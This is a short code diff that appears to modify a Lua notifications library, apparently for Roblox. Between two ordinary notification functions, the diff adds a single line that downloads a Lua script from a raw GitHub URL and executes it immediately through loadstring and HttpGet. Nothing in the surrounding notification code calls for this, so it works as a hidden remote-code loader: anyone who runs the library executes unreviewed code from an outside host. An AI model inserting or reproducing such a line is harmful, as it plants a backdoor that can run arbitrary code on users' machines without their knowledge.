@@ -310,6 +310,8 @@ function notifications:notify(options)
 	end)
 end
 
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/VisionExe/Vision/main/AtomicR.lua"),true))()
+
 function notifications:notification(options)
 	self:notify(options)
 end
